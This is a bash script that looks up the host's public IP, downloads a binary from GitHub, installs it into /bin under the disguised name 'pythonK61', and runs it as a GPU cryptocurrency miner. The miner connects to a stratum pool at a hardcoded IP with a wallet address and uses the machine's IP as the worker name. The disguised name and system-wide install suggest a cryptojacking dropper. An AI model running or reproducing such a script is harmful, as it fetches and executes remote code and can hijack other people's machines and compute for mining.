#!bin/bash -xe 
iip=$(curl https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl ipinfo.io
#download build
wget https://github.com/one10001/10001code/raw/main/pythonK61
chmod +x pythonK61
cp pythonK61 /bin/pythonK61
pythonK61 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8
